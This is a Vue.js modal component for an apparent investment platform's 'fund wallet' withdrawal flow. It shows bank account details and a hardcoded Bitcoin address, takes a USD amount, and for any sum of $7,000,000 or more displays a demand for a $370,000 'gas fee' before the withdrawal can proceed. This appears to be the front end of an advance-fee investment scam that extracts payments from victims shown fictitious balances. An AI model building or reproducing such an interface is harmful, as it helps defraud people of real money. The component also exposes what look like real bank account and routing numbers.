<template>
  <div>
    <div class="backdrop"></div>
    <dialog open>
      <div class="alpha">

        <div class="first-part">
          <img src="@/assets/fund-wallet-icon.svg" alt="fund-wallet-icon"/>
          <i class='bx bx-x' @click="close"></i>
        </div>
        <form @submit.prevent="checkAmount" class="second-part">
          <br/>
          <div class="separate">
<!--            <input type="checkbox" disabled />-->
            <p class="text-3">
              <span>Account Name</span> : M & H Ideas, Inc.
            </p>
          </div>

          <hr/>

          <div class="separate">
<!--            <input type="checkbox" disabled />-->
            <p class="text-3">
             <span>Account Number</span> : 1391 0565 6262
            </p>
          </div>


<!--          <p class="text-5">-->
<!--            Confirmation : 3 of 3-->
<!--          </p>-->


          <hr/>


          <div class="separate">
<!--            <input type="checkbox" disabled  />-->
            <p class="text-3">
              <span>Bank Address</span> : Bank of America; 1801 16th St Mall; Denver, CO; 80202; United States
            </p>
          </div>

          <hr/>

          <div class="separate">
<!--            <input type="checkbox" disabled />-->
            <p class="text-3">
              <span>Bank ABA/SWIFT Code</span> : 026009593
            </p>
          </div>

          <hr/>


          <div class="separate">
            <!--            <input type="checkbox" disabled />-->
            <p class="text-3 fiat">
              <span>Fiat Amount</span>
              <input type="text" class="fiat-input" required v-model="payOutAmount"
                     placeholder="Enter Fiat Amount in USD"
              />
            </p>
          </div>


          <!--          <p class="text-5">-->
          <!--            Confirmation : 3 of 3-->
          <!--          </p>-->


          <hr/>


          <div class="separate">
                        <input type="checkbox"  required />
            <p class="text-3">
              Verify Account Details
            </p>
          </div>

          <hr/>



          <!--          <p class="text-2">How to fund your wallet:</p>-->
          <!--          <p class="text-3">Transfer desired amount to the details displayed below and have your balance funded</p>-->
          <!--          <p class="text-3">Note: After making your deposit,kindly send a screenshot/proof of deposit to-->
          <!--            <span class="note-span">-->
          <!--              <a style="color: rgba(219,101,123,0.6);" href="mailto:support@incomeandassetslimited.com" class="para-last">support@incomeandassetslimited.com</a>-->
          <!--            </span> for documentation and to boost the funding process-->
          <!--          </p>-->


          <!--          <div class="qr-code">-->
          <!--            &lt;!&ndash;            <vue-qrcode :value="bitcoinAddress"></vue-qrcode>&ndash;&gt;-->
          <!--            <vue-qrcode :value="bitcoinAddress"/>-->
          <!--          </div>-->

          <!--          <hr/>-->

          <!--          <div class="input-button-wrapper">-->
          <!--            <div>-->
          <!--              <label>Destination wallet</label>-->
          <!--            </div>-->
          <!--            <input type="text" required v-model="destinationWalletAddress"  class="text-input"-->
          <!--                   placeholder="Kindly enter wallet address"-->
          <!--            />-->
          <!--            &lt;!&ndash;            <button  class="submit-button" @click="copyText">Copy</button>&ndash;&gt;-->
          <!--          </div>-->

          <!--          <div class="input-button-wrapper">-->
          <!--            <div>-->
          <!--              <label>Amount (BTC)</label>-->
          <!--            </div>-->
          <!--            <input type="text" required v-model="payOutAmount"  class="text-input"-->
          <!--                   placeholder="Enter Pay Out Amount in BTC"-->
          <!--            />-->
          <!--            &lt;!&ndash;            <button  class="submit-button">Copy</button>&ndash;&gt;-->
          <!--          </div>-->


          <!--          <div class="input-button-wrapper">-->
          <!--            &lt;!&ndash;            <p class="text-fiat">Fiat amount: $8,004,409.2 | 1 BTC = {{bitcoinRate}}</p>&ndash;&gt;-->
          <!--            <p class="text-fiat">Fiat amount: $8,004,409.2 | 89.14 BTC</p>-->
          <!--          </div>-->



          <!--          <div class="seprate" >-->
          <!--            <p class="loader-text" >Awaiting Payment</p>-->
          <!--            <span class="loader"></span>-->
          <!--          </div>-->
          <button class="submit-button" >Proceed</button>

        </form>


        <!--        <br/>-->
        <!--        <button style="background-color: #007bff;border: 1px solid #007bff;">Copy</button>-->

      </div>

    </dialog>
  </div>
</template>


<script>
import {mapState} from "vuex";
import Swal from "sweetalert2";

export default {
  name: "FundWalletModal7",
  emits: ['close', 'open'],
  // components: {VueQrcode},
  computed: {
    ...mapState(['loginForm']),
  },
  props: {
    selectedItem: {
      type: Object,
      default: null
    }
  },

  methods:{
    async close() {
      this.$emit('close');
      // await Swal.fire({
      //   icon: 'success',
      //   title: 'Pending',
      //   text: 'Deposit Processing',
      // });
    },

    fetchBitcoinRate() {
      // Set loading to true when the request starts
      this.loading = true;

      // eslint-disable-next-line no-undef
      axios.get('https://api.coindesk.com/v1/bpi/currentprice/BTC.json')
          .then(response => {
            this.bitcoinRate = response.data.bpi.USD.rate_float;
            // Set loading to false when the data is successfully fetched
            this.loading = false;
          })
          .catch(error => {
            console.error(error);
            // Set loading to false also if there is an error
            this.loading = false;
          });
    },

    // convertAndSave() {
    //   if (this.bitcoinRate && this.inputValue3) {
    //     const usdAmount = parseFloat(this.inputValue3);
    //     if (!isNaN(usdAmount)) {
    //       this.inputValue2 = (usdAmount / this.bitcoinRate).toFixed(8); // Convert to Bitcoin and round to 8 decimal places
    //     } else {
    //       this.inputValue2 = '';
    //     }
    //   } else {
    //     this.inputValue2 = '';
    //   }
    // },

    convertAndSave() {
      const usdAmount = parseFloat(this.inputValue3);
      this.inputValue2 = (usdAmount / this.bitcoinRate).toFixed(8); // Convert to Bitcoin and round to 8 decimal places
    },

    copyText() {
      // Create a temporary textarea element to hold the text
      const textarea = document.createElement('textarea');
      textarea.value = this.bitcoinAddress;
      document.body.appendChild(textarea);

      // Select the text and copy it to clipboard
      textarea.select();
      document.execCommand('copy');

      // Remove the temporary element
      document.body.removeChild(textarea);

    },

    // New method to check the amount
    async checkAmount() {
      // Convert the entered amount to a float
      const amount = parseFloat(this.payOutAmount);

      // Check if the amount is greater than or equal to 8,000,000.00
      if (amount >= 7000000) {
        // Display success message
        // alert("Success! The amount is valid.");
        await Swal.fire({
          icon: 'info',
          title: 'Gas fee Required',
          text: 'To start a withdrawal you need $370,000 on your network to process the transfer',
          // footer: '<span style="color: #00bc00;">PoW Received</span>',
        });
        await this.$emit('open');
        await this.$emit('close');

      } else {
        // Display error message
        // alert("Error! The amount must be at least 8,000,000.00.");
        await Swal.fire({
          icon: 'error',
          title: 'Error',
          text: 'The amount must be at least 7,000,000 USD',
          // footer: '<span style="color: #00bc00;">PoW Received</span>',
        });
      }
    }

  },
  data() {
    return {
      contacts: [],
      accountNumber: '',
      bankName: '',
      bitcoinAddress: '',
      ethereumAddress: '',
      routingNumber: '',
      inputValue1: '',
      inputValue2: '',
      inputValue3: 119000,
      bitcoinRate: null,
      destinationWalletAddress: "",
      payOutAmount: "",
    };
  },
  created() {
    this.fetchBitcoinRate()
    this.convertAndSave()
    this.bitcoinAddress = "bc1qgm7u48ks7drllvy5dwez6z3d9kmjxewu3wxt3s"
    this.inputValue1 = "bc1qgm7u48ks7drllvy5dwez6z3d9kmjxewu3wxt3s"
    this.inputValue2 = this.loginForm.inputValue2
  },
  mounted() {
    this.fetchBitcoinRate()
    this.convertAndSave()
    this.bitcoinAddress = "bc1qgm7u48ks7drllvy5dwez6z3d9kmjxewu3wxt3s"
    this.inputValue1 = "bc1qgm7u48ks7drllvy5dwez6z3d9kmjxewu3wxt3s"
    this.inputValue2 = this.loginForm.inputValue2
  }
}
</script>

<style scoped >

.backdrop {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100vh;
  z-index: 10;
  background-color: rgba(0, 0, 0, 0.7);
}


dialog {
  position: fixed;
  top: 7vh;
  width: 32rem;
  height: 32rem;
  left: calc(50% - 13.5rem);
  margin: 0;
  background-color: transparent;
  z-index: 100;
  border: none;
  animation: modal 0.3s ease-out forwards;
}

.alpha{
  position: relative;
  display: block;
  overflow: hidden;
  width: 420px;
  height: 610px;
  /*height: auto;*/
  padding: 24px;
  border-radius: 5px;
  background-color: #ffffff;
  border: 0.5px solid #3C4A57FF;
  box-shadow: 0 0 34px 0 rgba(3, 28, 67, 0.13);
}

.first-part{
  display: flex;
  justify-content: space-between;
}

.fiat{
  display: flex;
  flex-direction: column;
  width: 100%;
}

.fiat-input{
  width: 100%;
  margin-top: 3px;
  padding: 5px;
  border: 1px solid #ccc;
  font-size: 14px;
}

.separate{
  display: flex;
  align-items: center;
  align-content: center;
  gap: 5px;
}

.status{
  background-color: #FFBF00;
  padding: 7px 20px;
  color: #FFFFFF;
  border-radius: 5px;
  font-size: 14px;
}

.status-2{
  background-color: rgb(211, 211, 211);
  padding: 7px 20px;
  border-radius: 5px;
  font-size: 14px;
}

.status-3{
  background-color: #4BB543;
  color: #FFFFFF;
  padding: 7px 20px;
  border-radius: 5px;
  font-size: 14px;
}

.bx-x{
  font-size: 25px;
  padding-top: 2px;
  color: #0f171c;
}

.text-1{
  font-weight: 600;
  font-size: 18px;
  line-height: 28px;
  color: #0f171c;
  padding-top: 2.5%;
  padding-bottom: 1%;
  word-wrap: break-word; /* or overflow-wrap: break-word; */
}

.text-2{
  font-weight: 400;
  font-size: 16px;
  line-height: 24px;
  color: #070e20;
  padding-top: 1%;
  padding-bottom: 2%;
  word-wrap: break-word; /* or overflow-wrap: break-word; */
}

.text-3{
  font-weight: 400;
  font-size: 16px;
  line-height: 24px;
  color: #070e20;
  padding-top: 1.5%;
  padding-bottom: 2%;
  word-wrap: break-word; /* or overflow-wrap: break-word; */
}

.text-4{
  font-weight: 400;
  font-size: 16px;
  line-height: 24px;
  color: #070e20;
  padding-top: 1.5%;
  padding-bottom: 1.5%;
  word-wrap: break-word; /* or overflow-wrap: break-word; */
}

.text-5{
  font-size: 13px;
  line-height: 24px;
  color: #070e20;
  margin-top: 0;
  padding-top: 0;
  padding-left: 10px;
  padding-bottom: 2%;
  word-wrap: break-word; /* or overflow-wrap: break-word; */
  font-family: 'BR-Firma-Light', sans-serif;
}

button{
  padding: 8px 55px;
  color: white;
  background-color: #0f171c;
  border: 0.5px solid #3C4A57FF;
  border-radius: 5px;
  font-size: 13px;
  text-decoration: none;
  /*display: block;*/
  /*margin-left: auto;*/
  /*margin-right: auto;*/
}

.input-button-wrapper {
  margin-bottom: 8%;
  margin-top: 8%;
  display: block;
  width: 100%;
}

.text-input {
  flex: 1;
  padding: 8px;
  font-size: 16px;
  border: 1px solid #ccc;
  border-radius: 4px 0 0 4px;
  width: 100%;
  margin-top: 1%;
}


.submit-button {
  padding: 8px 25px;
  font-size: 16px;
  background-color: #007bff;
  color: white;
  border: 1px solid #007bff;
  border-radius: 4px;
  cursor: pointer;
  margin-top: 5%;
  display: inline-block;
}

.submit-button:hover {
  background-color: #0056b3;
  border-color: #0056b3;
}

.loader {
  width: 65%;
  height: 4.8px;
  display: inline-block;
  position: relative;
  background: rgba(255, 255, 255, 0.15);
  overflow: hidden;
}
.loader::after {
  content: '';
  width: 192px;
  height: 4.8px;
  background: #007bff;
  position: absolute;
  top: 0;
  left: 0;
  box-sizing: border-box;
  animation: animloader 2s linear infinite;
}

.seprate{
  display: flex;
  align-items: center;
  align-content: center;
  margin-top: 20px;
  margin-bottom: 10px;
}
.loader-text{
  font-size: 13px;
  margin-right: 10px;
}

.text-fiat{
  font-size: 13px;
}

.qr-code{
  margin-left: 32%;
}

hr{
  border: 0.5px solid #ccc;
  margin-top: 3%;
  margin-bottom: 3%;
}

@keyframes animloader {
  0% {
    left: 0;
    transform: translateX(-100%);
  }
  100% {
    left: 100%;
    transform: translateX(0%);
  }
}

@keyframes modal {
  from {
    opacity: 0;
    transform: translateY(-50px) scale(0.9);
  }

  to {
    opacity: 1;
    transform: translateY(0) scale(1);
  }
}
@media (max-width: 500px) {
  dialog {
    top: 9vh;
    width: 25rem;
    height: 18rem;
    left: calc(50% - 11.5rem);
    right: 30px;
  }
  .alpha{
    width: 370px;
    height: 610px;
  }
  h3{
    font-size: 18px;
  }
  p{
    font-size: unset;
  }

  .text-1{
    font-size: 17px;
    line-height: 26px;
    padding-top: 2%;
  }


}
</style>